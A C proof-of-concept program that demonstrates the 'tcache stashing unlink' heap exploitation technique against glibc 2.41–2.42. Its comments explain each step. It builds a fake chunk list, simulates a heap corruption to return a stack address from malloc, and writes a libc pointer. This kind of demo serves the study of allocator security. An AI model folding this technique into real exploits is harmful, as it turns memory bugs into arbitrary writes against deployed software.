#include<stdio.h>
#include<stdlib.h>
#include<assert.h>

/*
 * tcache stashing unlink attack demo 
 * PoC written by Imrane Haddaji (@tabacc0) for versions 2.41/2.42
 *
 * technique credits go to the original author
*/

int main(){
	printf("This is a demonstration of the tcache stashing unlink attack\n");
	printf("This PoC has been linked and tested against glibc 2.41-2.42 \n");
	printf("the goal is to use the SmallBin-To-Tcache stashing mechanism to return an\n");
	printf("arbitrary chunk , in our case , we want to return a chunk on the stack\n");
	printf("this technique also allows us to write a libc address to an arbitrary location\n");

	char * target_chunk[4] = {0};
	char **target = &target_chunk[2];

	printf("our target is : %p\n",target);
	printf("accounting for metadata , our target's chunk address is : %p\n",target_chunk);


	printf("the tcache metadata chunk is only allocated and initialized on the first call to \n");
	printf("malloc/calloc with a Tcache size on glibc 2.42  .\n,");
	printf("(see __libc_malloc and tcache_malloc_init functions)\n");
	printf("to avoid the tcache allocation messing with the heap layout , we will get it \n");
	printf("done now by allocting a Tcache sized chunk , this way it works\n");
	printf("on both versions\n");
	char * init_tcache = malloc(0x100);


	printf("now we allocate our victim chunk ,to avoid speding allocations filling/emptying\n");
	printf("the Tcache,we will allocate it as a LargeBin-size chunk , put it in the unsorted");
	printf("Bin and then cut it by allocating a chunk of a size chosen carefully to make \n");
	printf("the remainder SmallBin-sized");
	char **victim = malloc(0x500);
	printf("first after victim , we allocate a guard chunk to avoid consolidation with top\n");
	char *guard = malloc(0x1000);
	printf("now we free victim , it will be put in the UnsortedBin\n");
	free(victim);
	printf("allocate a chunk that will be cut from from victim , the remainder size in\n");
	printf("our case is 0x100 corresponding to malloc(0x90)\n");
	char *cut_victim = malloc(0x400);
	printf("our victim has 'moved' forward when we cut it , we update the victim pointer\n");
	printf("accordingly\n");
	victim = victim + 0x410/8;
	char **victim_chunk = victim - 2;
	char *put_smallbin = malloc(0x1000);

	printf("\nnow we will create fake chunk lists of 6 chunks on the heap \n");



	printf("we already have an inactive chunk that we used for guarding , use it as a list\n");
	char *(*fake_chunklist)[4] = (char *(*)[4]) guard;

	for (int i = 0 ; i < 5 ; i++){
		fake_chunklist[i][3] = (char *) &fake_chunklist[i+1];
	}

	printf("\nmake the last element in the list point to target_chunk such that it is\n");
	printf("the 7th chunk the list\n");
	fake_chunklist[5][3] = (char *) target_chunk;

	printf("\nmake the fd pointer of the head of the list point to victim to bypass the \n");
	printf("SmallBin corruption check\n");
	fake_chunklist[0][2] = (char *) victim_chunk;

	printf("\nthen make target_chunk->bk point to target_+0x10 , this way a libc pointer will be \n");
	printf("written to target_chunk + 0x20.\n");
	target_chunk[3] = (char *) target ;


	printf("\n\nnow we simulate a vulnerability that will allow us to make victim->bk point to\n");
	printf("the head of our chunk list\n");
	//VULNERABILITY
	victim_chunk[3] = (char*)fake_chunklist[0];
	//VULNERABILITY

	printf("\ntrigger the stashing by allocating a chunk of size 0x90\n");
	char *trigger_chain = malloc(0xf0);
	printf("\nnow target_chunk , being the last element is the list, makes target in the \n");
	printf("head of the tcache bin\n");
	printf("the next allocation should point to target\n");
	printf("char **tc_head = malloc(0xf0);\n");
	char **tc_head = malloc(0xf0);
	printf("\n\nassert(tc_head == target);\n");
	assert(tc_head == target);
	printf("further , target + 0x10 bytes should be a libc address:\n");
	printf("\n%p\n",target[2]);
	exit(0);
}
